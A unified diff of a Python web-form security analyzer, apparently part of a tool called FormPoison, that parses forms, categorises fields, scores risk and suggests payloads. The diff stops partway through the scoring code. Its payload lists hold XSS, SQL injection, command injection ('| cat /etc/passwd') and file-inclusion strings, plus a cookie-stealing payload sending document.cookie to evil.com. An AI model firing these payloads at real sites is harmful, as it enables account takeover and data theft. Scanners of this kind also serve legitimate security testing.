@@ -1,121 +1,509 @@
 #!/usr/bin/env python3
+"""
+FormAtion - Advanced Web Form Analysis Module for FormPoison
+PortSwigger Research-Based Web Application Security Analyzer
+"""
 
 import asyncio
 import aiohttp
 import argparse
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urljoin, urlparse, parse_qs
 import json
 import ssl
+import hashlib
+import re
+from datetime import datetime
+from typing import Dict, List, Optional, Any, Set, Tuple
+from dataclasses import dataclass, field, asdict
+from enum import Enum
 from rich.console import Console
 from rich.table import Table
 from rich.panel import Panel
+from rich.progress import Progress, SpinnerColumn, TextColumn
 from rich import box
 from rich.text import Text
 from rich.syntax import Syntax
-import random
+from rich.layout import Layout
+from rich.tree import Tree
+import logging
+
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger('FormAtion')
 
 console = Console()
 
+class ThreatLevel(Enum):
+    CRITICAL = "critical"
+    HIGH = "high"
+    MEDIUM = "medium"
+    LOW = "low"
+    INFO = "info"
+
+class VulnerabilityType(Enum):
+    XSS_REFLECTED = "Reflected XSS"
+    XSS_STORED = "Stored XSS"
+    XSS_DOM = "DOM-based XSS"
+    XSS_MUTATION = "Mutation XSS"
+    SQL_INJECTION = "SQL Injection"
+    CSRF = "Cross-Site Request Forgery"
+    FILE_UPLOAD = "Malicious File Upload"
+    COMMAND_INJECTION = "Command Injection"
+    XXE = "XML External Entity"
+    SSRF = "Server-Side Request Forgery"
+    OPEN_REDIRECT = "Open Redirect"
+    IDOR = "Insecure Direct Object Reference"
+    PARAMETER_TAMPERING = "Parameter Tampering"
+    TEMPLATE_INJECTION = "Template Injection"
+    PROTOTYPE_POLLUTION = "Prototype Pollution"
+    HTTP_PARAMETER_POLLUTION = "HTTP Parameter Pollution"
+    CORS_MISCONFIGURATION = "CORS Misconfiguration"
+    CLICKJACKING = "Clickjacking"
+
+@dataclass
+class FieldAnalysis:
+    element_type: str
+    field_type: str
+    name: str
+    id: str
+    value: str
+    attributes: Dict[str, str] = field(default_factory=dict)
+    suspicious_patterns: List[str] = field(default_factory=list)
+    field_category: str = 'other'
+    portswigger_risks: List[str] = field(default_factory=list)
+    is_text_input: bool = False
+    threat_level: str = 'low'
+    security_implications: List[str] = field(default_factory=list)
+    potential_payloads: List[str] = field(default_factory=list)
+    
+    def to_dict(self) -> Dict:
+        return asdict(self)
+
+@dataclass
+class FormAnalysis:
+    form_id: int
+    action: str
+    method: str
+    enctype: str
+    all_fields: List[FieldAnalysis] = field(default_factory=list)
+    text_input_fields: List[FieldAnalysis] = field(default_factory=list)
+    non_text_fields: List[FieldAnalysis] = field(default_factory=list)
+    vulnerability_indicators: List[str] = field(default_factory=list)
+    complexity_score: int = 0
+    portswigger_vectors: List[str] = field(default_factory=list)
+    html_source: str = ''
+    
+    def to_dict(self) -> Dict:
+        return {
+            'form_id': self.form_id,
+            'action': self.action,
+            'method': self.method,
+            'enctype': self.enctype,
+            'all_fields': [f.to_dict() for f in self.all_fields],
+            'text_input_fields': [f.to_dict() for f in self.text_input_fields],
+            'non_text_fields': [f.to_dict() for f in self.non_text_fields],
+            'vulnerability_indicators': self.vulnerability_indicators,
+            'complexity_score': self.complexity_score,
+            'portswigger_vectors': self.portswigger_vectors,
+            'html_source': self.html_source
+        }
+
+@dataclass
+class SecurityHeaderAnalysis:
+    header_name: str
+    value: Optional[str]
+    status: str
+    risk_level: ThreatLevel
+    description: str
+    recommendation: str
+    compliance_standard: str
+    
+    def to_dict(self) -> Dict:
+        return asdict(self)
+
+@dataclass
+class TechnologyInfo:
+    name: str
+    version: Optional[str]
+    confidence: str
+    category: str
+    evidence: str
+    vulnerabilities: List[Dict[str, str]] = field(default_factory=list)
+
 class FormAtionAnalyzer:
-    def __init__(self, url, user_agent=None, proxies=None):
+    """Advanced form analysis engine with comprehensive security assessment."""
+    
+    VERSION = "2.0.0"
+    
+    def __init__(self, url: str, user_agent: Optional[str] = None, 
+                 proxies: Optional[str] = None, timeout: int = 30,
+                 max_redirects: int = 5, verify_ssl: bool = True):
         self.url = url
-        self.user_agent = user_agent or "FormAtion/1.0"
+        self.user_agent = user_agent or f"FormAtion/{self.VERSION} (Security Analyzer)"
         self.proxies = proxies
+        self.timeout = aiohttp.ClientTimeout(total=timeout)
+        self.max_redirects = max_redirects
+        self.verify_ssl = verify_ssl
+        self.session: Optional[aiohttp.ClientSession] = None
+        
+        # Results containers
         self.results = {
             'url': url,
+            'scan_timestamp': datetime.now().isoformat(),
             'forms_analysis': [],
             'security_headers': {},
             'technology_stack': {},
             'recommendations': [],
             'formpoison_flags': [],
-            'attack_vectors': []
+            'attack_vectors': [],
+            'compliance_report': {},
+            'risk_assessment': {},
+            'remediation_plan': [],
+            'executive_summary': {}
         }
-        self.response_headers = {}
+        
+        self.response_headers: Dict[str, str] = {}
+        self.page_content: Optional[str] = None
+        self.parsed_url = urlparse(url)
+        
+        # Advanced configuration
+        self.security_patterns = self._load_security_patterns()
+        self.technology_fingerprints = self._load_technology_fingerprints()
+        self.payload_suggestions = self._load_payload_suggestions()
+        
+    def _load_security_patterns(self) -> Dict[str, List[str]]:
+        """Load comprehensive security testing patterns."""
+        return {
+            'xss_vectors': [
+                '<script>alert(1)</script>',
+                '"><script>alert(1)</script>',
+                'javascript:alert(1)',
+                '<img src=x onerror=alert(1)>',
+                '<svg/onload=alert(1)>',
+                '{{constructor.constructor("alert(1)")()}}',
+                '${alert(1)}'
+            ],
+            'sql_injection': [
+                "' OR '1'='1",
+                "1' OR '1'='1' --",
+                "admin'--",
+                "1; DROP TABLE users--",
+                "' UNION SELECT NULL--"
+            ],
+            'command_injection': [
+                '; ls -la',
+                '| cat /etc/passwd',
+                '`id`',
+                '$(whoami)',
+                '&& dir'
+            ],
+            'file_inclusion': [
+                '../../etc/passwd',
+                '....//....//etc/passwd',
+                'file:///etc/passwd',
+                'php://filter/convert.base64-encode/resource=index.php'
+            ]
+        }
     
-    async def analyze_site(self):
-        console.print(Panel.fit("🔍 [bold cyan]FormAtion - Starting Deep Analysis[/bold cyan]", border_style="cyan"))
-        
-        content = await self.fetch_page()
-        if not content:
-            console.print("[bold red]❌ Failed to fetch page content[/bold red]")
-            return self.results
-
-        await self.analyze_forms(content)
-
-        await self.analyze_security_headers()
-
-        await self.detect_technology_stack(content)
-
-        self.generate_recommendations()
-        
-        self.display_report()
-        
+    def _load_technology_fingerprints(self) -> Dict[str, Dict[str, Any]]:
+        """Load technology detection fingerprints."""
+        return {
+            'frameworks': {
+                'React': {
+                    'patterns': ['react', 'react-dom', '_reactRootContainer', '__REACT_DEVTOOLS_GLOBAL_HOOK__'],
+                    'version_regex': r'React v?(\d+\.\d+\.\d+)',
+                    'category': 'frontend'
+                },
+                'Vue.js': {
+                    'patterns': ['vue', 'vue.js', '__vue__', 'v-bind', 'v-model'],
+                    'version_regex': r'Vue\.js v?(\d+\.\d+\.\d+)',
+                    'category': 'frontend'
+                },
+                'Angular': {
+                    'patterns': ['angular', 'ng-version', 'ng-app', 'angular.module'],
+                    'version_regex': r'Angular(?:JS)? v?(\d+\.\d+\.\d+)',
+                    'category': 'frontend'
+                },
+                'Django': {
+                    'patterns': ['django', 'csrfmiddlewaretoken', 'django.jQuery'],
+                    'version_regex': r'Django ([\d.]+)',
+                    'category': 'backend'
+                },
+                'Laravel': {
+                    'patterns': ['laravel', 'csrf-token', 'laravel_session'],
+                    'version_regex': r'Laravel v?(\d+\.\d+\.\d+)',
+                    'category': 'backend'
+                }
+            },
+            'cms': {
+                'WordPress': {
+                    'patterns': ['wp-content', 'wp-includes', 'wp-json', 'wordpress'],
+                    'version_regex': r'WordPress ([\d.]+)',
+                    'meta_key': 'generator'
+                },
+                'Drupal': {
+                    'patterns': ['drupal', 'sites/default', 'drupalSettings'],
+                    'version_regex': r'Drupal ([\d.]+)',
+                    'meta_key': 'generator'
+                },
+                'Joomla': {
+                    'patterns': ['joomla', 'media/system/js/', 'com_content'],
+                    'version_regex': r'Joomla! ([\d.]+)',
+                    'meta_key': 'generator'
+                }
+            }
+        }
+    
+    def _load_payload_suggestions(self) -> Dict[str, List[str]]:
+        """Load payload suggestions based on field types and frameworks."""
+        return {
+            'login': [
+                "admin' OR '1'='1' --",
+                "admin'--",
+                "' OR 1=1--",
+                "admin'/*",
+                "') OR ('1'='1"
+            ],
+            'search': [
+                "<script>alert('XSS')</script>",
+                "') UNION SELECT * FROM users--",
+                "${7*7}",
+                "{{7*7}}",
+                "1 AND 1=1"
+            ],
+            'content': [
+                "<img src=x onerror=alert(1)>",
+                "<svg/onload=fetch('http://evil.com/steal?cookie='+document.cookie)>",
+                "javascript:alert(document.domain)",
+                "{{this.constructor.constructor('alert(1)')()}}"
+            ]
+        }
+    
+    async def __aenter__(self):
+        """Async context manager entry."""
+        connector = aiohttp.TCPConnector(ssl=self.verify_ssl, limit=10)
+        self.session = aiohttp.ClientSession(
+            timeout=self.timeout,
+            connector=connector,
+            headers={'User-Agent': self.user_agent}
+        )
+        return self
+    
+    async def __aexit__(self, exc_type, exc_val, exc_tb):
+        """Async context manager exit."""
+        if self.session:
+            await self.session.close()
+    
+    async def analyze_site(self) -> Dict[str, Any]:
+        """Main analysis orchestration method."""
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            console=console,
+            transient=True
+        ) as progress:
+            task = progress.add_task("[cyan]Analyzing web forms...", total=None)
+            
+            console.print(Panel.fit(
+                f"🔍 [bold cyan]FormAtion {self.VERSION} - Advanced Web Form Analysis[/bold cyan]\n"
+                f"[dim]Target: {self.url}[/dim]\n"
+                f"[dim]Methodology: PortSwigger Research-Based[/dim]",
+                border_style="cyan"
+            ))
+            
+            # Phase 1: Fetch and parse
+            progress.update(task, description="[cyan]Fetching page content...")
+            self.page_content = await self._fetch_page()
+            if not self.page_content:
+                console.print("[bold red]❌ Failed to fetch page content[/bold red]")
+                return self.results
+            
+            # Phase 2: Form analysis
+            progress.update(task, description="[cyan]Analyzing forms and fields...")
+            await self._analyze_forms_deep()
+            
+            # Phase 3: Security headers
+            progress.update(task, description="[cyan]Checking security headers...")
+            await self._analyze_security_headers_comprehensive()
+            
+            # Phase 4: Technology detection
+            progress.update(task, description="[cyan]Detecting technology stack...")
+            await self._detect_technology_stack_advanced()
+            
+            # Phase 5: Advanced scanning
+            progress.update(task, description="[cyan]Running advanced security checks...")
+            await self._run_advanced_security_checks()
+            
+            # Phase 6: Generate reports
+            progress.update(task, description="[cyan]Generating comprehensive report...")
+            self._generate_recommendations_enhanced()
+            self._generate_compliance_report()
+            self._create_risk_assessment()
+            self._build_remediation_plan()
+            
+            # Display results
+            self._display_comprehensive_report()
+            
         return self.results
     
-    async def fetch_page(self):
-        try:
-            headers = {'User-Agent': self.user_agent}
-            timeout = aiohttp.ClientTimeout(total=30)
-            
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                async with session.get(self.url, headers=headers, proxy=self.proxies) as response:
+    async def _fetch_page(self) -> Optional[str]:
+        """Enhanced page fetching with retry logic and error handling."""
+        max_retries = 3
+        for attempt in range(max_retries):
+            try:
+                if not self.session:
+                    await self.__aenter__()
+                
+                async with self.session.get(
+                    self.url,
+                    proxy=self.proxies,
+                    allow_redirects=True,
+                    max_redirects=self.max_redirects
+                ) as response:
+                    # Store response metadata
                     self.results['response_code'] = response.status
                     self.results['content_type'] = response.headers.get('Content-Type', '')
                     self.results['server'] = response.headers.get('Server', '')
+                    self.results['response_size'] = response.headers.get('Content-Length', 'Unknown')
+                    self.results['final_url'] = str(response.url)
                     
-                    for key, value in response.headers.items():
-                        self.response_headers[key.lower()] = value
+                    # Store all headers
+                    self.response_headers = {k.lower(): v for k, v in response.headers.items()}
                     
-                    return await response.text()
-        except Exception as e:
-            console.print(f"[red]Error fetching page: {str(e)}[/red]")
-            return None
+                    # Check for redirects
+                    if response.history:
+                        self.results['redirect_chain'] = [
+                            {'url': str(h.url), 'status': h.status} 
+                            for h in response.history
+                        ]
+                    
+                    content = await response.text()
+                    self.results['page_size'] = len(content)
+                    
+                    return content
+                    
+            except asyncio.TimeoutError:
+                logger.warning(f"Timeout on attempt {attempt + 1}")
+                if attempt == max_retries - 1:
+                    console.print(f"[red]❌ Timeout fetching {self.url}[/red]")
+                    return None
+                await asyncio.sleep(2 ** attempt)
+                
+            except aiohttp.ClientError as e:
+                logger.error(f"Client error: {e}")
+                if attempt == max_retries - 1:
+                    console.print(f"[red]❌ Error fetching page: {str(e)}[/red]")
+                    return None
+                await asyncio.sleep(2 ** attempt)
+                
+            except Exception as e:
+                logger.error(f"Unexpected error: {e}")
+                console.print(f"[red]❌ Unexpected error: {str(e)}[/red]")
+                return None
+        
+        return None
     
-    async def analyze_forms(self, content):
-        soup = BeautifulSoup(content, 'html.parser')
+    async def _analyze_forms_deep(self) -> None:
+        """Enhanced form analysis with deeper inspection."""
+        if not self.page_content:
+            return
+        
+        soup = BeautifulSoup(self.page_content, 'html.parser')
+        
+        # Find all forms including dynamically created ones
         forms = soup.find_all('form')
+        # Also check for form-like structures
+        form_like = soup.find_all(['div', 'section'], class_=re.compile(r'form|login|signup|contact|search'))
         
-        console.print(f"\n[bold yellow]📋 Found {len(forms)} forms[/bold yellow]")
+        all_forms = list(forms) + [f for f in form_like if f not in forms]
         
-        for i, form in enumerate(forms):
-            form_analysis = {
-                'form_id': i + 1,
-                'action': form.get('action', ''),
-                'method': form.get('method', 'GET').upper(),
-                'enctype': form.get('enctype', ''),
-                'all_fields': [],
-                'text_input_fields': [],
-                'non_text_fields': [],
-                'vulnerability_indicators': [],
-                'complexity_score': 0,
-                'portswigger_vectors': [],
-                'html_source': str(form)[:2000]
+        console.print(f"\n[bold yellow]📋 Found {len(all_forms)} forms/form-like structures[/bold yellow]")
+        
+        for i, form in enumerate(all_forms):
+            form_analysis = FormAnalysis(
+                form_id=i + 1,
+                action=form.get('action', ''),
+                method=form.get('method', 'GET').upper(),
+                enctype=form.get('enctype', ''),
+                html_source=str(form)[:3000]
+            )
+            
+            # Parse all interactive elements
+            interactive_elements = {
+                'inputs': form.find_all('input'),
+                'textareas': form.find_all('textarea'),
+                'selects': form.find_all('select'),
+                'buttons': form.find_all('button'),
+                'datalists': form.find_all('datalist'),
+                'outputs': form.find_all('output'),
+                'keygens': form.find_all('keygen')
             }
             
-            inputs = form.find_all('input')
-            textareas = form.find_all('textarea')
-            selects = form.find_all('select')
-            buttons = form.find_all('button')
+            all_fields = []
+            for element_type, elements in interactive_elements.items():
+                for element in elements:
+                    field_info = self._analyze_field_enhanced(element, element_type)
+                    all_fields.append(field_info)
+                    
+                    if field_info.is_text_input:
+                        form_analysis.text_input_fields.append(field_info)
+                    else:
+                        form_analysis.non_text_fields.append(field_info)
             
-            all_fields = inputs + textareas + selects + buttons
+            form_analysis.all_fields = all_fields
             
-            for field in all_fields:
-                field_info = self.analyze_field(field)
-                form_analysis['all_fields'].append(field_info)
-                
-                if self.is_text_input_field(field):
-                    form_analysis['text_input_fields'].append(field_info)
-                else:
-                    form_analysis['non_text_fields'].append(field_info)
+            # Perform deep analysis
+            self._assess_form_vulnerability_enhanced(form_analysis)
+            self._detect_portswigger_vectors_enhanced(form_analysis)
+            self._analyze_form_behavior(form_analysis)
             
-            self.assess_form_vulnerability(form_analysis)
-            
-            self.detect_portswigger_vectors(form_analysis)
-            
-            self.results['forms_analysis'].append(form_analysis)
+            self.results['forms_analysis'].append(form_analysis.to_dict())
     
-    def is_text_input_field(self, field):
+    def _analyze_field_enhanced(self, field, element_type: str) -> FieldAnalysis:
+        """Enhanced field analysis with deeper security insights."""
+        field_type = field.get('type', 'text') if field.name == 'input' else field.name
+        field_name = field.get('name', '')
+        field_id = field.get('id', '')
+        field_value = field.get('value', '')
+        
+        field_analysis = FieldAnalysis(
+            element_type=element_type,
+            field_type=field_type,
+            name=field_name,
+            id=field_id,
+            value=field_value,
+            attributes=dict(field.attrs),
+            is_text_input=self._is_text_input_field_enhanced(field)
+        )
+        
+        # Advanced categorization
+        field_analysis.field_category = self._categorize_field_advanced(
+            field_name, field_id, field_type, element_type, field_analysis.attributes
+        )
+        
+        # Multi-layer pattern detection
+        self._detect_suspicious_patterns_enhanced(field_analysis)
+        
+        # PortSwigger risk mapping
+        self._detect_portswigger_risks_enhanced(field_analysis)
+        
+        # Security implications
+        self._analyze_security_implications(field_analysis)
+        
+        # Suggest potential payloads
+        self._suggest_payloads(field_analysis)
+        
+        # Threat level assessment
+        self._assess_field_threat_level_enhanced(field_analysis)
+        
+        return field_analysis
+    
+    def _is_text_input_field_enhanced(self, field) -> bool:
+        """Enhanced text input detection."""
         if field.name == 'textarea':
             return True
             
@@ -124,263 +512,459 @@ class FormAtionAnalyzer:
             text_input_types = [
                 'text', 'password', 'email', 'search', 'url', 'tel', 
                 'number', 'date', 'datetime', 'datetime-local', 'month', 
-                'week', 'time', 'range', 'color'
+                'week', 'time', 'range', 'color', 'hidden'
             ]
             return field_type in text_input_types
             
         if field.name == 'select':
-            return True  
+            return True
             
         return False
     
-    def analyze_field(self, field):
-        field_type = field.get('type', 'text') if field.name == 'input' else field.name
-        field_name = field.get('name', '')
-        field_id = field.get('id', '')
-        field_value = field.get('value', '')
+    def _categorize_field_advanced(self, name: str, id_: str, type_: str, 
+                                   element_type: str, attributes: Dict[str, str]) -> str:
+        """Advanced field categorization with more categories."""
+        name_lower = name.lower()
+        id_lower = id_.lower()
         
-        field_analysis = {
-            'element_type': field.name,
-            'type': field_type,
-            'name': field_name,
-            'id': field_id,
-            'value': field_value,
-            'attributes': dict(field.attrs),
-            'suspicious_patterns': [],
-            'field_category': 'other',
-            'portswigger_risks': [],
-            'is_text_input': self.is_text_input_field(field),
-            'threat_level': 'low'
+        # Priority-based categorization
+        categories = {
+            'password': ['password', 'pass', 'pwd', 'secret', 'passwd', 'pin', 'credentials'],
+            'login': ['user', 'login', 'email', 'username', 'account', 'uid', 'uname'],
+            'file_upload': ['file', 'upload', 'attachment', 'avatar', 'photo', 'image', 'document'],
+            'search': ['search', 'query', 'q', 'keyword', 'find', 'lookup'],
+            'content': ['comment', 'message', 'content', 'body', 'description', 'bio', 'text', 'post'],
+            'contact': ['name', 'phone', 'tel', 'address', 'city', 'zip', 'state', 'country'],
+            'hidden': ['hidden', 'csrf', 'token', 'nonce', 'session', 'state'],
+            'choice': ['checkbox', 'radio', 'choice', 'option', 'select', 'preference'],
+            'payment': ['credit', 'card', 'payment', 'billing', 'cc', 'cvv', 'expiry', 'amount'],
+            'date': ['date', 'time', 'year', 'month', 'day', 'dob', 'birthday'],
+            'url': ['url', 'link', 'website', 'href', 'redirect', 'callback'],
+            'api': ['api_key', 'apikey', 'token', 'auth', 'bearer', 'jwt', 'access'],
+            'database': ['id', 'uid', 'pid', 'item_id', 'record_id', 'object_id'],
+            'other': []
         }
         
-        field_analysis['field_category'] = self.categorize_field(field_name, field_id, field_type, field.name)
+        # Check by priority
+        for category, keywords in categories.items():
+            if any(keyword in name_lower or keyword in id_lower for keyword in keywords):
+                if category == 'password' or type_ == 'password':
+                    return 'password'
+                elif category == 'hidden' or type_ == 'hidden':
+                    return 'hidden'
+                elif category == 'file_upload' or type_ == 'file':
+                    return 'file_upload'
+                return category
         
-        self.detect_suspicious_patterns(field_analysis)
-        
-        self.detect_portswigger_risks(field_analysis)
-        
-        self.assess_field_threat_level(field_analysis)
-        
-        return field_analysis
-    
-    def categorize_field(self, name, id, type, element_type):
-        name_lower = name.lower()
-        id_lower = id.lower()
-        
-        # Login fields
-        login_keywords = ['user', 'login', 'email', 'username', 'account', 'uid']
-        if any(keyword in name_lower or keyword in id_lower for keyword in login_keywords):
-            return 'login'
-        
-        # Password fields
-        password_keywords = ['password', 'pass', 'pwd', 'secret', 'passwd']
-        if any(keyword in name_lower or keyword in id_lower for keyword in password_keywords) or type == 'password':
-            return 'password'
-        
-        # File upload
-        if type == 'file':
-            return 'file_upload'
-        
-        # Search fields
-        search_keywords = ['search', 'query', 'q', 'keyword']
-        if any(keyword in name_lower or keyword in id_lower for keyword in search_keywords):
-            return 'search'
-        
-        # Comment/Content fields
-        content_keywords = ['comment', 'message', 'content', 'body', 'description', 'bio']
-        if any(keyword in name_lower or keyword in id_lower for keyword in content_keywords):
-            return 'content'
-        
-        # Contact fields
-        contact_keywords = ['name', 'phone', 'tel', 'address', 'city', 'zip']
-        if any(keyword in name_lower or keyword in id_lower for keyword in contact_keywords):
-            return 'contact'
-            
-        # Hidden fields (often contain sensitive data)
-        if type == 'hidden':
-            return 'hidden'
-        
-        # Checkbox/Radio buttons
-        if type in ['checkbox', 'radio']:
-            return 'choice'
-            
-        # Submit buttons
-        if type == 'submit' or element_type == 'button':
-            return 'button'
-            
-        # Select dropdowns
+        # Check by element type
         if element_type == 'select':
             return 'dropdown'
+        elif element_type == 'button' or type_ in ['submit', 'button', 'reset']:
+            return 'button'
         
         return 'other'
     
-    def detect_suspicious_patterns(self, field_analysis):
-        name = field_analysis['name'].lower()
-        attrs = field_analysis['attributes']
-        field_type = field_analysis['type']
-        element_type = field_analysis['element_type']
+    def _detect_suspicious_patterns_enhanced(self, field_analysis: FieldAnalysis) -> None:
+        """Enhanced suspicious pattern detection."""
+        name = field_analysis.name.lower()
+        attrs = field_analysis.attributes
+        field_type = field_analysis.field_type
+        element_type = field_analysis.element_type
         
-        if field_analysis['is_text_input'] and not any(attr in attrs for attr in ['maxlength', 'pattern', 'required', 'min', 'max']):
-            field_analysis['suspicious_patterns'].append('no_client_side_validation')
+        # Client-side validation analysis
+        if field_analysis.is_text_input:
+            validation_attrs = ['maxlength', 'pattern', 'required', 'min', 'max', 'step', 'minlength']
+            if not any(attr in attrs for attr in validation_attrs):
+                field_analysis.suspicious_patterns.append('no_client_side_validation')
+            
+            # Check for weak validation
+            if 'pattern' in attrs:
+                weak_patterns = ['.*', '.+', '[\\s\\S]*', '^.*$']
+                if attrs['pattern'] in weak_patterns:
+                    field_analysis.suspicious_patterns.append('weak_validation_pattern')
         
-        suspicious_names = ['csrf', 'token', 'auth', 'key', 'hash', 'nonce', 'session']
-        if any(suspicious in name for suspicious in suspicious_names):
-            field_analysis['suspicious_patterns'].append('suspicious_field_name')
+        # Sensitive field exposure
+        sensitive_names = ['csrf', 'token', 'auth', 'key', 'hash', 'nonce', 'session', 'jwt', 'bearer', 'api']
+        if any(sensitive in name for sensitive in sensitive_names):
+            field_analysis.suspicious_patterns.append('sensitive_field_exposed')
         
-        # Auto-complete enabled on sensitive fields
-        if attrs.get('autocomplete') == 'on' and field_analysis['field_category'] in ['password', 'login']:
-            field_analysis['suspicious_patterns'].append('autocomplete_enabled')
+        # Autocomplete analysis
+        if attrs.get('autocomplete') == 'on' and field_analysis.field_category in ['password', 'login']:
+            field_analysis.suspicious_patterns.append('autocomplete_enabled_on_sensitive')
         
-        # Hidden fields with values (potential sensitive data exposure)
-        if field_type == 'hidden' and field_analysis.get('value'):
-            field_analysis['suspicious_patterns'].append('hidden_field_with_value')
+        # Hidden field data exposure
+        if field_type == 'hidden' and field_analysis.value:
+            if len(field_analysis.value) > 20:
+                field_analysis.suspicious_patterns.append('hidden_field_with_large_value')
+            
+            # Check for base64 encoded data
+            if re.match(r'^[A-Za-z0-9+/=]+$', field_analysis.value) and len(field_analysis.value) > 30:
+                field_analysis.suspicious_patterns.append('possible_base64_in_hidden_field')
+            
+            # Check for JWT tokens
+            if '.' in field_analysis.value and len(field_analysis.value) > 50:
+                field_analysis.suspicious_patterns.append('possible_jwt_in_hidden_field')
         
-        # Checkbox/radio with predefined values (parameter tampering)
-        if field_type in ['checkbox', 'radio'] and field_analysis.get('value'):
-            field_analysis['suspicious_patterns'].append('predefined_choice_value')
+        # Parameter tampering indicators
+        if field_type in ['checkbox', 'radio'] and field_analysis.value:
+            field_analysis.suspicious_patterns.append('predefined_choice_value_tampering')
+        
+        # Missing name attribute
+        if not name and element_type != 'button':
+            field_analysis.suspicious_patterns.append('missing_name_attribute')
+        
+        # Large maxlength
+        if 'maxlength' in attrs and int(attrs['maxlength']) > 5000:
+            field_analysis.suspicious_patterns.append('excessive_maxlength')
+        
+        # Disabled fields
+        if attrs.get('disabled') is not None:
+            field_analysis.suspicious_patterns.append('disabled_field_present')
+        
+        # Readonly fields
+        if attrs.get('readonly') is not None:
+            field_analysis.suspicious_patterns.append('readonly_field_present')
     
-    def detect_portswigger_risks(self, field_analysis):
-        field_type = field_analysis['type']
-        field_category = field_analysis['field_category']
-        is_text_input = field_analysis['is_text_input']
+    def _detect_portswigger_risks_enhanced(self, field_analysis: FieldAnalysis) -> None:
+        """Enhanced PortSwigger risk detection."""
+        field_type = field_analysis.field_type
+        field_category = field_analysis.field_category
+        is_text_input = field_analysis.is_text_input
+        name = field_analysis.name.lower()
         
-        # XSS risks 
-        if is_text_input and field_category in ['content', 'search', 'comment']:
-            field_analysis['portswigger_risks'].append('reflected_xss')
+        risk_map = {
+            'content': ['reflected_xss', 'stored_xss', 'dom_xss', 'html_injection'],
+            'search': ['reflected_xss', 'sql_injection', 'command_injection'],
+            'login': ['sql_injection', 'nosql_injection', 'ldap_injection', 'authentication_bypass'],
+            'password': ['credential_stuffing', 'brute_force'],
+            'url': ['open_redirect', 'ssrf'],
+            'file_upload': ['file_upload_xss', 'rce_upload', 'path_traversal', 'xxe_upload'],
+            'api': ['api_key_exposure', 'jwt_tampering'],
+            'payment': ['payment_injection', 'price_manipulation'],
+            'database': ['idor', 'mass_assignment'],
+            'hidden': ['csrf_token_analysis', 'parameter_pollution'],
+            'choice': ['parameter_tampering', 'business_logic_bypass'],
+            'contact': ['xss_reflected', 'html_injection']
+        }
         
-        if is_text_input and field_category in ['content', 'comment']:
-            field_analysis['portswigger_risks'].append('stored_xss')
+        if field_category in risk_map:
+            field_analysis.portswigger_risks.extend(risk_map[field_category])
         
-        # SQL Injection risks 
-        if is_text_input and field_category in ['login', 'search']:
-            field_analysis['portswigger_risks'].append('sql_injection')
+        # Type-specific risks
+        if field_type == 'email':
+            field_analysis.portswigger_risks.extend(['email_injection', 'header_injection'])
+        elif field_type == 'number':
+            field_analysis.portswigger_risks.extend(['integer_overflow', 'negative_value_injection'])
+        elif field_type == 'date':
+            field_analysis.portswigger_risks.extend(['date_injection', 'format_string'])
         
-        # File upload risks
-        if field_category == 'file_upload':
-            field_analysis['portswigger_risks'].extend(['file_upload_xss', 'rce_upload'])
-        
-        # CSRF risks
-        if field_category == 'hidden' and 'token' in field_analysis['name'].lower():
-            field_analysis['portswigger_risks'].append('csrf_token_detected')
-        
-        # Parameter tampering for choice fields
-        if field_category == 'choice' and field_analysis.get('value'):
-            field_analysis['portswigger_risks'].append('parameter_tampering')
+        # Remove duplicates
+        field_analysis.portswigger_risks = list(set(field_analysis.portswigger_risks))
     
-    def assess_field_threat_level(self, field_analysis):
+    def _analyze_security_implications(self, field_analysis: FieldAnalysis) -> None:
+        """Analyze broader security implications of each field."""
+        
+        if field_analysis.field_category == 'password':
+            if not any(attr in field_analysis.attributes for attr in ['minlength', 'pattern']):
+                field_analysis.security_implications.append('weak_password_policy')
+        
+        if field_analysis.field_category == 'file_upload':
+            if 'accept' not in field_analysis.attributes:
+                field_analysis.security_implications.append('unrestricted_file_types')
+        
+        if field_analysis.field_category == 'hidden':
+            if 'csrf' in field_analysis.name.lower() or 'token' in field_analysis.name.lower():
+                field_analysis.security_implications.append('csrf_protection_detected')
+            
+            if 'id' in field_analysis.name.lower():
+                field_analysis.security_implications.append('potential_idor')
+    
+    def _suggest_payloads(self, field_analysis: FieldAnalysis) -> None:
+        """Suggest potential test payloads based on field analysis."""
+        category = field_analysis.field_category
+        
+        if category in self.payload_suggestions:
+            field_analysis.potential_payloads = self.payload_suggestions[category]
+        
+        # Add framework-specific payloads
+        if 'react' in str(field_analysis.attributes).lower():
+            field_analysis.potential_payloads.append('dangerouslySetInnerHTML')
+        elif 'angular' in str(field_analysis.attributes).lower():
+            field_analysis.potential_payloads.append('{{constructor.constructor("alert(1)")()}}')
+    
+    def _assess_field_threat_level_enhanced(self, field_analysis: FieldAnalysis) -> None:
+        """Enhanced threat level assessment with scoring."""
         threat_score = 0
- 
-        if any(risk in field_analysis['portswigger_risks'] for risk in ['sql_injection', 'rce_upload', 'stored_xss']):
-            threat_score += 3
-        elif any(risk in field_analysis['portswigger_risks'] for risk in ['reflected_xss', 'file_upload_xss']):
-            threat_score += 2
-        elif any(risk in field_analysis['portswigger_risks'] for risk in ['csrf_token_detected', 'parameter_tampering']):
-            threat_score += 1
-
-        threat_score += len(field_analysis['suspicious_patterns'])
         
-        if threat_score >= 3:
-            field_analysis['threat_level'] = 'high'
+        # Risk-based scoring
+        risk_weights = {
+            'sql_injection': 5, 'rce_upload': 5, 'stored_xss': 4,
+            'command_injection': 5, 'xxe_upload': 5, 'ssrf': 4,
+            'reflected_xss': 3, 'file_upload_xss': 3, 'dom_xss': 3,
+            'authentication_bypass': 4, 'idor': 3, 'open_redirect': 2,
+            'csrf_token_analysis': 1, 'parameter_tampering': 2,
+            'credential_stuffing': 2, 'brute_force': 2
+        }
+        
+        for risk in field_analysis.portswigger_risks:
+            threat_score += risk_weights.get(risk, 1)
+        
+        # Pattern-based scoring
+        pattern_weights = {
+            'no_client_side_validation': 2,
+            'sensitive_field_exposed': 3,
+            'hidden_field_with_large_value': 2,
+            'possible_jwt_in_hidden_field': 3,
+            'autocomplete_enabled_on_sensitive': 2,
+            'unrestricted_file_types': 3,
+            'weak_password_policy': 2
+        }
+        
+        for pattern in field_analysis.suspicious_patterns:
+            threat_score += pattern_weights.get(pattern, 1)
+        
+        # Determine threat level
+        if threat_score >= 10:
